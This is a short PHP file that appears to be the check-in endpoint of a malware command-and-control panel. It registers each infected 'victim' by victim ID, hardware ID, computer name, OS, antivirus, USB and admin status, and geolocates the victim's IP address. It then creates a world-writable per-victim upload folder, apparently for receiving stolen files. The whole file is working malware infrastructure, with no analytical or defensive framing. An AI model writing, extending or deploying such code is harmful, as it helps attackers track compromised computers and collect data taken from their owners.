<?php
include_once 'classes/Database.php';
include_once 'classes/Clients.php';
include_once 'classes/Utils.php';

$utils = new Utils;

$client = new Clients;

$ipaddress = $utils->sanitize($_SERVER['REMOTE_ADDR']);
$country = getConteryCode($ipaddress);
$date = date("Y-m-d");
$data = isset($_GET['data']) ? explode("|BN|", $utils->sanitize($utils->base64_decode_url($_GET['data']))) : '';

print_r($data);
$clientdata = [
    'vicid' => $data[0],
    'hwid' => strtoupper(sha1($data[1])),
    'ipaddress' => $ipaddress,
    'computername' => $data[2],
    'country' => $country,
    'os' => $data[3],
    'insdate' => $date,
    'update_at' => date("m/d/Y H:i:s", time()),
    'pings' => 0,
    'antivirus' => $data[4],
    'version' => $data[5],
    'status' => $data[6],
    'is_usb' => $data[7],
    'is_admin' => $data[8],
];

$client->newClient($clientdata);
@new_dir(trim($data[0], "./"));

function getConteryCode($ipaddress)
{
    $utils = new Utils;
    $json = $utils->callAPI("GET", "http://www.geoplugin.net/json.gp?ip=" . $ipaddress, false);
    $data = json_decode($json);
    if ($data->geoplugin_countryCode == "") {
        return "X";
    } else {
        return strtolower($data->geoplugin_countryCode);
    }
}

function new_dir($victimID)
{
    try {
        @mkdir("upload/$victimID");
        @copy(realpath("upload/index.php"), "upload/$victimID/index.php");
        @copy(realpath("upload/.htaccess"), "upload/$victimID/.htaccess");
        @chmod("upload/$victimID", 0777);
    } catch (Exception $e) {
        return $e->getMessage();
    }
}
